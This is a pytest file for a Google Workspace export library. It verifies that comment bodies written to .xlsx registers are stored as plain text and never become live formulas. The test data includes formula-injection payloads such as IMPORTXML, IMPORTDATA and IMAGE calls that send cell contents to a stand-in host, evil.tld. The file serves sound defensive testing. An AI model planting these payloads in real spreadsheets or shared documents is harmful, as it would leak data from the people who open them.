"""The `.xlsx` register writes untrusted content as **text**, never as a formula.

`to_xlsx` built rows with `ws.append([...])`, and **openpyxl infers cell type from value**: a
leading `=` becomes `data_type='f'`, a live formula. Verified at the file-format level rather
than by round-tripping openpyxl's own output, because "openpyxl reads it back as a string" is
not the same claim as "Excel treats it as text":

    today                   <c r="A1"><f>IMPORTXML(...)</f><v /></c>          <- <f> element
    with data_type='s'      <c r="A1" t="inlineStr"><is><t>=IMPORTXML(...)</t></is></c>

The first is a formula element; the `=` is stripped because XLSX formulas do not carry it. The
second is an inline string with the `=` inside `<t>`, which renders as literal text.

Same class as the 0.24.0 yank: the fix then went to the CSV sibling and not to this one. Which
left three paths with three postures — CSV escaped all four dangerous prefixes, `.xlsx` escaped
none, and a Sheets write relied on `RAW` that the MCP layer had overridden (#181).

**The escape sets are deliberately per-format and must stay that way.** openpyxl infers a formula
from `=` alone; Excel reading a *CSV* also acts on `+ - @`; a `RAW` Sheets write needs no escaping
at all. A single shared "escape formula characters" helper would be wrong in two directions —
under-escaping the CSV or gratuitously mangling values in the other two.

Which is why the fix here is **not** an apostrophe prefix. Forcing the cell's type keeps the
value byte-identical to what the reviewer wrote, so the register stays a faithful record; an
apostrophe would put a stray character into everybody's spreadsheet to defend against a
character only one reader cares about.
"""
from __future__ import annotations

import asyncio
import re
import zipfile

import openpyxl
import pytest

from csa_google_workspace import Workspace, _export
from csa_google_workspace._export import _build_xlsx, to_xlsx
from csa_google_workspace.backend import FakeBackend
from csa_google_workspace.mcp import settings_from_env
from csa_google_workspace.mcp.server import create_server
from csa_google_workspace.policy import PolicyBackend

DOC = "d1"
PAYLOAD = '=IMPORTXML("https://evil.tld/?d="&A1,"//x")'


def cell_xml(path, ref="A2"):
    """The raw cell element, because openpyxl's own re-read is not the thing under test."""
    with zipfile.ZipFile(path) as z:
        sheet = z.read("xl/worksheets/sheet1.xml").decode()
    match = re.search(rf'<c r="{ref}".*?</c>|<c r="{ref}"[^/]*/>', sheet, re.S)
    return match.group(0) if match else ""


class TestTheWrittenFileContainsNoFormulaElement:
    @pytest.mark.parametrize("payload", [
        '=IMPORTXML("https://evil.tld/?d="&A1,"//x")',
        '=IMPORTDATA("https://evil.tld/x.csv")',
        '=IMPORTRANGE("1abc","A1")',
        '=IMAGE("https://evil.tld/p.png?d="&A1)',
        "=HYPERLINK(\"https://evil.tld\",\"click\")",
        "=1+1",
    ])
    def test_a_leading_equals_is_written_as_text(self, tmp_path, payload):
        target = tmp_path / "r.xlsx"
        to_xlsx(["text"], [{"text": payload}], target, title="Draft")
        xml = cell_xml(target)
        assert "<f>" not in xml, f"written as a live formula: {xml}"
        assert openpyxl.load_workbook(target).active["A2"].data_type == "s"

    def test_the_value_is_preserved_byte_for_byte(self, tmp_path):
        """A register is a record. Mangling the value to defend the reader would make the
        register wrong about what somebody said."""
        target = tmp_path / "r.xlsx"
        to_xlsx(["text"], [{"text": PAYLOAD}], target, title="Draft")
        assert openpyxl.load_workbook(target).active["A2"].value == PAYLOAD

    def test_no_apostrophe_was_prepended(self, tmp_path):
        """The CSV remedy is an apostrophe; here it would be gratuitous, because forcing the
        type already works and leaves the value clean."""
        target = tmp_path / "r.xlsx"
        to_xlsx(["text"], [{"text": PAYLOAD}], target, title="Draft")
        assert not str(openpyxl.load_workbook(target).active["A2"].value).startswith("'")

    @pytest.mark.parametrize("payload", ["+1+1", "-1+1", "@SUM(A1)"])
    def test_the_other_prefixes_are_left_alone(self, tmp_path, payload):
        """openpyxl does not infer a formula from these, and Excel opening an .xlsx does not
        act on them either - only Excel opening a CSV does. Escaping them here would mangle
        legitimate content, which is why the per-format sets differ."""
        target = tmp_path / "r.xlsx"
        to_xlsx(["text"], [{"text": payload}], target, title="Draft")
        assert openpyxl.load_workbook(target).active["A2"].value == payload


class TestThroughTheActualExportTool:
    """The path a user takes: a hostile comment body, exported to .xlsx."""

    def build(self):
        backend = FakeBackend(
            {DOC: {"id": DOC, "name": "Draft",
                   "mimeType": "application/vnd.google-apps.document"}},
            documents={DOC: {"body": {"content": []}}},
            comments={DOC: [{"id": "t1", "content": PAYLOAD,
                             "author": {"displayName": "Attacker"},
                             "createdTime": "2026-08-20T10:00:00Z",
                             "resolved": False, "replies": []}]})
        st = settings_from_env({"CSA_GW_ALLOWLIST_READ": "*", "CSA_GW_ALLOWLIST_MODIFY": "*",
                                "CSA_GW_PROFILE": "full"})
        app = create_server(lambda: Workspace(PolicyBackend(backend, st.policy)), settings=st)
        return app

    def test_a_hostile_comment_body_does_not_become_a_formula(self, tmp_path):
        app = self.build()
        out = asyncio.run(app.call_tool("export_comments", {
            "fileId": DOC, "destination": "xlsx", "path": str(tmp_path / "r.xlsx")})
        ).structured_content
        target = out["written_path"]
        with zipfile.ZipFile(target) as z:
            sheet = z.read("xl/worksheets/sheet1.xml").decode()
        assert "<f>" not in sheet, "the exported register contains a live formula"
        assert "IMPORTXML" in sheet, "sanity: the payload should be present, as text"


class TestTheDocstringNoLongerReadsAsAnAssurance:
    """The reasoning must stay attached to the code that does the typing.

    Pointed at `_build_xlsx` rather than `to_xlsx` since the builder was extracted so the same
    formatted workbook could also be produced as bytes for upload. That refactor moved this
    rationale off the function this test used to watch, and the test caught it - which is the
    only reason the guard is worth having.
    """

    def test_it_says_why_there_are_no_formulas_and_that_it_is_enforced(self):
        text = _build_xlsx.__doc__ or ""
        assert "infer" in text.lower(), (
            "the docstring must say openpyxl INFERS type from value - the old text said 'no "
            "formulas, deliberately' about the register's own columns and read as an assurance "
            "that the path was formula-free")

    def test_every_public_entry_point_reaches_that_builder(self):
        """So neither writer can drift into building its own workbook without the typing. The
        guarantee is a property of the BUILDER; a second construction path would silently not
        have it."""
        import inspect

        from csa_google_workspace import _export
        for fn in (_export.to_xlsx, _export.to_xlsx_bytes):
            assert "_build_xlsx" in inspect.getsource(fn), (
                f"{fn.__name__} must go through _build_xlsx, which is what forces text typing")

    def test_the_bytes_path_warns_it_is_for_new_files_only(self):
        """Uploading a workbook over an EXISTING spreadsheet resets every comment anchor to A1
        (measured 2026-08-31). The one function that produces upload-ready bytes is where
        somebody looking for that route will land."""
        text = (_export.to_xlsx_bytes.__doc__ or "").lower()
        assert "new" in text and "anchor" in text
